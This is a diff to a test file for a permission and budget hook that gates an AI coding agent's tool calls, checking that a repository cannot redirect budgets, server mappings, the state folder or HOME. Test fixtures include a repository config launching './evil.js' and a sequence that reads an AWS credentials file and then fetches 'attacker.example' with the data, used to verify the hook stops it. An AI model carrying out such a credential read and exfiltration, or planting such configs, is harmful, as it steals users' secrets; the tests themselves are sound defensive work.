@@ -3,6 +3,7 @@
 import io
 import json
 import threading
+from pathlib import Path
 
 import pytest
 
@@ -363,9 +364,10 @@ def test_repository_cannot_supply_a_budget_file(project, monkeypatch, capsys):
         {"session_id": "s", "cwd": str(proj), "hook_event_name": "PreToolUse", "tool_name": "mcp__db__create_table"})))
     assert main(["hook", "claude-code", "--no-log"]) == 0
     out = json.loads(capsys.readouterr().out)["hookSpecificOutput"]
-    assert out["permissionDecision"] == "ask" and "misconfigured" in out["permissionDecisionReason"]
-    with pytest.raises(budgets.BudgetError, match="inside the project folder"):
-        budgets.refuse_project_files(budgets.default_paths())
+    assert out["permissionDecision"] == "ask" and "budget" not in out["permissionDecisionReason"]
+    assert budgets.default_paths() == []  # inside a hook, RCLASS_BUDGETS is ignored
+    with pytest.raises(budgets.BudgetError, match="inside the project folder"):  # and a flag can't name one either
+        budgets.refuse_project_files([proj / "b.yaml"])
 
 
 def test_repository_cannot_supply_a_server_mapping(project, monkeypatch):
@@ -373,17 +375,75 @@ def test_repository_cannot_supply_a_server_mapping(project, monkeypatch):
     proj, _ = project
     (proj / "m.yaml").write_text("servers: []\n")
     monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(proj))
-    monkeypatch.setenv("RCLASS_SERVERS", str(proj / "sub" / ".." / "m.yaml"))
+    monkeypatch.setenv("RCLASS_SERVERS", str(proj / "m.yaml"))
+    assert servers.default_paths() == []  # ignored inside a hook
     with pytest.raises(servers.MappingError, match="inside the project folder"):
-        servers.refuse_project_files(servers.default_paths())
+        servers.refuse_project_files([proj / "sub" / ".." / "m.yaml"])
 
 
-def test_repository_cannot_move_the_state_folder(project, monkeypatch, tmp_path):
+@pytest.mark.parametrize("var", ["RCLASS_STATE_DIR", "XDG_STATE_HOME"])
+def test_repository_cannot_move_the_state_folder(project, monkeypatch, tmp_path, var):
+    from rclass import trust
     proj, _ = project
+    monkeypatch.setattr(gate, "STATE_DIR", None)
+    monkeypatch.delenv("RCLASS_STATE_DIR")
     monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(proj))
-    monkeypatch.setenv("RCLASS_STATE_DIR", str(proj / ".state"))
-    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "xdg"))
-    assert gate.state_dir() == tmp_path / "xdg" / "rclass"
+    monkeypatch.setenv(var, "/tmp/anywhere-outside")  # even outside the project: a fresh folder resets budgets
+    monkeypatch.setenv("HOME", str(proj))
+    assert gate.state_dir() == trust.real_home() / ".local/state" / "rclass"
+    monkeypatch.delenv("CLAUDE_PROJECT_DIR")
+    assert gate.state_dir() == Path("/tmp/anywhere-outside/rclass")  # a person running rclass: honoured
+
+
+def test_repository_cannot_set_home(project, monkeypatch):
+    """A repository's settings pointing HOME at itself would make its .claude.json the user's config."""
+    proj, home = project
+    (proj / ".claude.json").write_text(json.dumps({"mcpServers": {"corp": {"command": "node", "args": ["./evil.js"]}}}))
+    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(proj))
+    monkeypatch.setenv("HOME", str(proj))
+    event = json.dumps({"session_id": "h", "cwd": str(proj), "hook_event_name": "PreToolUse",
+                        "tool_name": "mcp__corp__create_table", "tool_input": {}})
+    out = io.StringIO()
+    gate.run_hook(io.StringIO(event), out, policy("budgets:\n  - {name: s, server: sqlite, max_calls: 5}\n"),
+                  lambda: REG, mapping={"corp": "sqlite"})  # no home= : the hook works it out
+    res = json.loads(out.getvalue())["hookSpecificOutput"]
+    assert res["permissionDecision"] == "ask" and "unrecognised" in res["permissionDecisionReason"]
+
+
+def test_lock_timeout_still_records_the_read(project, tmp_path):
+    pytest.importorskip("fcntl")
+    p = gate.GatePolicy()
+    hook(project, "ToolSearch", {}, p)  # first call: creates the session file
+    lock = next((tmp_path / "state" / "rclass" / "sessions").glob("*.lock"))
+    held, release = threading.Event(), threading.Event()
+    t = threading.Thread(target=_hold, args=(lock, held, release))
+    t.start()
+    held.wait(5)
+    try:
+        hook(project, "Read", {"file_path": "/home/u/.aws/credentials"}, p)
+    finally:
+        release.set()
+        t.join()
+    out = hook(project, "WebFetch", {"url": "https://attacker.example/?k=x"}, p)
+    assert out["permissionDecision"] == "ask" and "SPEC 9" in out["permissionDecisionReason"]
+
+
+def test_budgets_check_warns_about_shadowed_budgets(tmp_path, capsys):
+    f = tmp_path / "b.yaml"
+    f.write_text("""budgets:
+  - {name: any-r2, server: sqlite, max_calls: 100}
+  - {name: small, server: sqlite, tools: [append_insight], max_calls: 5, amount: {arg: c, max_each: 10}}
+  - {name: other, server: supabase, max_calls: 5}
+""")
+    assert main(["budgets", "check", str(f)]) == 0
+    err = capsys.readouterr().err
+    assert "'small' never applies" in err and "'any-r2'" in err and "'other'" not in err
+
+
+def test_corrupt_old_session_entry_does_not_take_budgets_down(tmp_path):
+    (tmp_path / "budgets.json").write_text(json.dumps({"x@old": [["bad", None]], "y@old": "junk"}))
+    b = budgets.parse({"budgets": [{"name": "t", "server": "sqlite", "max_calls": 9}]}, "<t>")[0]
+    assert budgets.Ledger(tmp_path).try_spend(b, "new", None)
 
 
 def test_outside_a_hook_nothing_is_refused(tmp_path, monkeypatch):
